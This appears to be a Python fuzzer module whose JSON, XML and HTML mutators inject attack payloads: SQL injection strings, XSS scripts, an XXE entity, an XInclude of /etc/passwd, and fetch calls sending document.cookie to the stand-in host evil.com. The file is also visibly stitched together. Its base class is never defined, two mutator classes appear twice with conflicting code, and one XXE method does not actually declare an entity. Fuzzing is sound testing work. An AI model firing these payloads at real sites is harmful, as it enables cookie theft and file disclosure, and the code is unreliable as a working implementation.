"""
Abstract Syntax Tree (AST) Grammar-Guided Mutator.
Implements syntactic boundary mutations for structured payloads
(JSON/XML/HTML).
"""

from __future__ import annotations

import copy
import html.parser
import json
import random
import re
import xml.etree.ElementTree as ET
from abc import ABC, abstractmethod
from io import StringIO
from typing import Any


class JSONASTMutator(BaseASTMutator):
    """Mutates JSON payloads by traversing their AST and applying syntactic transformations."""

    def __init__(self, strategies: list[Any] | None = None):
        super().__init__()
        self.strategies = (
            strategies
            if strategies is not None
            else [
                self._mutate_values,
                self._swap_keys,
                self._nest_deeply,
                self._type_confusion,
            ]
        )

    def mutate(self, base_json: str) -> list[str]:
        """Generate syntactic mutations of the input JSON string."""
        try:
            ast = json.loads(base_json)
        except json.JSONDecodeError:
            return []

        results = []
        for strategy in self.strategies:
            mutated_ast = strategy(copy.deepcopy(ast))  # Work on a fresh copy
            results.append(json.dumps(mutated_ast, separators=(",", ":")))

        return results

    def _mutate_values(self, node: Any) -> Any:
        """Replace primitive values with boundary/injection values."""
        if isinstance(node, dict):
            new_dict = {}
            for k in node:
                new_dict[k] = self._mutate_values(node[k])
            return new_dict
        elif isinstance(node, list):
            new_list = []
            for item in node:
                new_list.append(self._mutate_values(item))
            return new_list
        elif isinstance(node, str):
            return random.choice(["' OR '1'='1", "<script>alert(1)</script>", "null"])  # noqa: S311
        elif isinstance(node, (int, float)):
            return random.choice([0, -1, 2147483647])  # noqa: S311
        return node

    def _swap_keys(self, node: Any) -> Any:
        """Swap keys within a dictionary to test schema flexibility."""
        if isinstance(node, dict) and len(node) >= 2:
            new_node = copy.deepcopy(node)
            keys = list(new_node.keys())
            k1, k2 = random.sample(keys, 2)
            new_node[k1], new_node[k2] = new_node[k2], new_node[k1]
            return new_node
        return node

    def _nest_deeply(self, node: Any) -> Any:
        """Recursively nest a value to test parser stack limits."""
        if isinstance(node, dict) and node:
            new_node = copy.deepcopy(node)
            key = random.choice(list(new_node.keys()))  # noqa: S311
            val = new_node[key]
            for _ in range(20):
                val = {"n": val}
            new_node[key] = val
            return new_node
        return node

    def _type_confusion(self, node: Any) -> Any:
        """Change the type of a node (e.g. string to list)."""
        if isinstance(node, dict) and node:
            new_node = copy.deepcopy(node)
            key = random.choice(list(new_node.keys()))  # noqa: S311
            new_node[key] = [new_node[key], "type_confusion_probe"]
            return new_node
        return node


class XMLASTMutator(BaseASTMutator):
    """Mutates XML payloads by analyzing the XML tree and applying syntactic transformations.

    Uses Python's xml.etree.ElementTree to parse and mutate XML documents.
    Supports element renaming, attribute injection, text mutation, deep nesting,
    entity injection, and XInclude injection.
    """

    def __init__(self, strategies: list[Any] | None = None):
        super().__init__()
        self.strategies = (
            strategies
            if strategies is not None
            else [
                self._mutate_text_values,
                self._inject_attributes,
                self._nest_deeply,
                self._inject_entities,
                self._inject_xinclude,
            ]
        )

    def mutate(self, base_xml: str) -> list[str]:
        """Generate syntactic mutations of the input XML string."""
        import xml.etree.ElementTree as ET
        try:
            root = ET.fromstring(base_xml)
        except ET.ParseError:
            return []

        results = []
        for strategy in self.strategies:
            try:
                mutated_root = copy.deepcopy(root)
                mutated_root = strategy(mutated_root)
                results.append(ET.tostring(mutated_root, encoding="unicode"))
            except Exception:
                continue

        return results

    def _mutate_text_values(self, node: Any) -> Any:
        """Replace element text values with boundary/injection values."""
        import xml.etree.ElementTree as ET
        if isinstance(node, ET.Element):
            if node.text and node.text.strip():
                node.text = random.choice(["' OR '1'='1", "<script>alert(1)</script>", "null", "{{7*7}}"])
            for child in node:
                self._mutate_text_values(child)
        return node

    def _inject_attributes(self, node: Any) -> Any:
        """Inject or modify attributes on elements."""
        import xml.etree.ElementTree as ET
        if isinstance(node, ET.Element):
            injection_attrs = {
                "xsi:nil": "true",
                "xmlns:xsi": "http://www.w3.org/2001/XMLSchema-instance",
                "xsi:schemaLocation": "http://evil.com/schema.xsd",
                "id": "' OR '1'='1",
            }
            key = random.choice(list(injection_attrs.keys()))
            node.set(key, injection_attrs[key])
            for child in node:
                self._inject_attributes(child)
        return node

    def _nest_deeply(self, node: Any) -> Any:
        """Recursively nest a value to test parser stack limits."""
        import xml.etree.ElementTree as ET
        if isinstance(node, ET.Element):
            if list(node):
                for child in node:
                    self._nest_deeply(child)
            # Add deep nesting under the first child
            if len(list(node)) > 0:
                child = list(node)[0]
                wrapper = child
                for _ in range(50):
                    new_elem = ET.Element("n")
                    new_elem.text = "deep"
                    wrapper.append(new_elem)
                    wrapper = new_elem
        return node

    def _inject_entities(self, node: Any) -> Any:
        """Inject XML entity references to test entity expansion (XXE)."""
        import xml.etree.ElementTree as ET
        if isinstance(node, ET.Element):
            # Add a comment with entity reference indicator
            node.text = (node.text or "") + "&xxe;"
            # Add entity declaration via DOCTYPE-like string (for serialization)
            node.set("xmlns:xxe", "http://evil.com/xxe")
            for child in node:
                self._inject_entities(child)
        return node

    def _inject_xinclude(self, node: Any) -> Any:
        """Inject XInclude elements to test XML Inclusions."""
        import xml.etree.ElementTree as ET
        if isinstance(node, ET.Element):
            xi = ET.SubElement(node, "{http://www.w3.org/2001/XInclude}include")
            xi.set("parse", "text")
            xi.set("href", "file:///etc/passwd")
            for child in node:
                self._inject_xinclude(child)
        return node


class HTMLASTMutator(BaseASTMutator):
    """Mutates HTML payloads by traversing the HTML tree and applying syntactic transformations.

    Uses a simple HTML parser (html.parser) for basic structure awareness.
    Supports attribute injection, script injection, form manipulation,
    and DOM clobbering attacks.
    """

    def __init__(self, strategies: list[Any] | None = None):
        super().__init__()
        self.strategies = (
            strategies
            if strategies is not None
            else [
                self._inject_script_tags,
                self._mutate_form_actions,
                self._inject_event_handlers,
                self._dom_clobber,
                self._inject_iframe,
            ]
        )

    def _parse_html_soup(self, html: str) -> Any:
        """Try to parse HTML with html.parser, fall back to regex-based mutation."""
        from html.parser import HTMLParser

        class TagCollector(HTMLParser):
            def __init__(self):
                super().__init__()
                self.tags: list[dict[str, Any]] = []
                self._current_tag: dict[str, Any] | None = None

            def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
                self.tags.append({"tag": tag, "attrs": dict(attrs), "type": "start"})

            def handle_endtag(self, tag: str) -> None:
                self.tags.append({"tag": tag, "type": "end"})

        collector = TagCollector()
        collector.feed(html)
        return collector.tags if collector.tags else None

    def mutate(self, base_html: str) -> list[str]:
        """Generate syntactic mutations of the input HTML string."""
        results = []
        tags = self._parse_html_soup(base_html)
        if not tags:
            return [base_html + "<!--fuzzer_mutated-->"]

        for strategy in self.strategies:
            try:
                mutated = strategy(base_html, tags)
                if mutated:
                    results.append(mutated)
            except Exception:
                continue

        return results

    def _inject_script_tags(self, html: str, tags: list[dict[str, Any]]) -> str:
        """Inject <script> tags with XSS payloads."""
        injection = '<script>alert(document.domain)</script>'
        # Insert after <head> or at the beginning
        head_end = html.find("</head>")
        if head_end != -1:
            return html[:head_end] + injection + html[head_end:]
        return injection + html

    def _mutate_form_actions(self, html: str, tags: list[dict[str, Any]]) -> str:
        """Mutate form action attributes to point to attacker-controlled URLs."""
        import re
        result = re.sub(
            r'<form\s[^>]*action=["\']([^"\']+)["\']',
            r'<form action="https://evil.com/steal"',
            html,
            flags=re.IGNORECASE,
        )
        return result

    def _inject_event_handlers(self, html: str, tags: list[dict[str, Any]]) -> str:
        """Add event handler attributes to HTML elements."""
        import re
        # Add onclick to <a>, <button>, <input> tags
        result = re.sub(
            r'(<(?:a|button|input|div|span)\b[^>]*)(/?>)',
            r'\1 onclick="fetch(\'https://evil.com/steal\')" \2',
            html,
            flags=re.IGNORECASE,
        )
        return result

    def _dom_clobber(self, html: str, tags: list[dict[str, Any]]) -> str:
        """Inject DOM clobbering payloads (id attributes that shadow global variables)."""
        import re
        clobber_payloads = [
            '<img id="cookie" src="x" onerror="alert(1)">',
            '<a id="cookie" href="https://evil.com">click</a>',
            '<form id="config"><input name="__proto__" value="polluted"></form>',
        ]
        # Inject at the end of <body> or at the end of the document
        body_end = html.find("</body>")
        if body_end != -1:
            return html[:body_end] + random.choice(clobber_payloads) + html[body_end:]
        return html + random.choice(clobber_payloads)

    def _inject_iframe(self, html: str, tags: list[dict[str, Any]]) -> str:
        """Inject iframe elements for clickjacking/framing tests."""
        injection = '<iframe src="https://evil.com" style="display:none"></iframe>'
        body_end = html.find("</body>")
        if body_end != -1:
            return html[:body_end] + injection + html[body_end:]
        return html + injection


class XMLASTMutator(BaseASTMutator):
    """Mutates XML payloads by parsing them into an element tree and applying transformations."""

    def __init__(self, strategies: list[Any] | None = None) -> None:
        super().__init__()
        self.strategies = (
            strategies
            if strategies is not None
            else [
                self._mutate_text_content,
                self._swap_elements,
                self._deeply_nest,
                self._inject_entities,
                self._mutate_attributes,
            ]
        )

    def mutate(self, base_xml: str) -> list[str]:
        results: list[str] = []
        for strategy in self.strategies:
            result = strategy(base_xml)
            if result:
                results.append(result)
        return results

    def _mutate_text_content(self, xml_str: str) -> str | None:
        """Replace text content in XML elements with boundary values."""
        return re.sub(
            r">([^<]+)<",
            lambda m: ">" + random.choice(["' OR '1'='1", "<script>alert(1)</script>", "null", "${7*7}", ""]) + "<",
            xml_str,
        )

    def _swap_elements(self, xml_str: str) -> str | None:
        """Swap the order of sibling XML elements."""
        root = self._safe_parse(xml_str)
        if root is None:
            return None
        children = list(root)
        if len(children) < 2:
            return None
        idx1, idx2 = random.sample(range(len(children)), 2)
        root[idx1], root[idx2] = root[idx2], root[idx1]
        return ET.tostring(root, encoding="unicode")

    def _deeply_nest(self, xml_str: str) -> str | None:
        """Nest an element deeply to test parser stack limits."""
        root = self._safe_parse(xml_str)
        if root is None:
            return None
        if len(root) == 0:
            return None
        target = root[random.randint(0, len(root) - 1)]
        for _ in range(20):
            wrapper = ET.Element("nested")
            wrapper.append(target)
            target = wrapper
        return ET.tostring(root, encoding="unicode")

    def _inject_entities(self, xml_str: str) -> str | None:
        """Inject XXE / entity-related payloads."""
        payload = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            "<root>&xxe;</root>"
        )
        return payload

    def _mutate_attributes(self, xml_str: str) -> str | None:
        """Mutate XML attribute values."""
        return re.sub(
            r'(\w+)=["\']([^"\']*)["\']',
            lambda m: m.group(1) + '="' + random.choice(["' OR '1'='1", "><script>", "", "null", "${7*7}"]) + '"',
            xml_str,
        )

    @staticmethod
    def _safe_parse(xml_str: str) -> ET.Element | None:
        try:
            return ET.fromstring(xml_str)
        except ET.ParseError:
            return None


class HTMLASTMutator(BaseASTMutator):
    """Mutates HTML payloads using regex-based tree manipulation."""

    def __init__(self, strategies: list[Any] | None = None) -> None:
        super().__init__()
        self.strategies = (
            strategies
            if strategies is not None
            else [
                self._mutate_attributes,
                self._inject_event_handlers,
                self._deeply_nest,
                self._inject_scripts,
            ]
        )

    def mutate(self, base_html: str) -> list[str]:
        results: list[str] = []
        for strategy in self.strategies:
            result = strategy(base_html)
            if result:
                results.append(result)
        return results

    def _mutate_attributes(self, html_str: str) -> str | None:
        """Replace attribute values with XSS probes."""
        return re.sub(
            r'(\w+)=["\']([^"\']*)["\']',
            lambda m: m.group(1) + '="' + random.choice(["javascript:alert(1)", "'';!--\"<XSS>=&{()}"]) + '"',
            html_str,
        )

    def _inject_event_handlers(self, html_str: str) -> str | None:
        """Inject event handler attributes into HTML tags."""
        events = ["onload", "onerror", "onclick", "onfocus", "onmouseover", "onchange"]
        handlers = ["alert(1)", "fetch('https://evil.com/?'+document.cookie)"]
        tag_pattern = re.compile(r"(<\s*\w+[^>]*)>")
        def _inject(m: re.Match) -> str:
            tag = m.group(1)
            if any(ev.split("=")[0] in tag for ev in events):
                return tag + ">"
            event = random.choice(events)
            handler = random.choice(handlers)
            return f'{tag} {event}="{handler}">'
        return tag_pattern.sub(_inject, html_str)

    def _deeply_nest(self, html_str: str) -> str | None:
        """Nest HTML tags deeply to test parser stack limits."""
        result = html_str
        for _ in range(100):
            result = f"<div>{result}</div>"
        return result

    def _inject_scripts(self, html_str: str) -> str | None:
        """Inject script tags into the HTML."""
        scripts = [
            "<script>alert(1)</script>",
            "<script>fetch('https://evil.com/').then(r=>r.text()).then(alert)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input autofocus onfocus=alert(1)>",
        ]
        return html_str + random.choice(scripts)
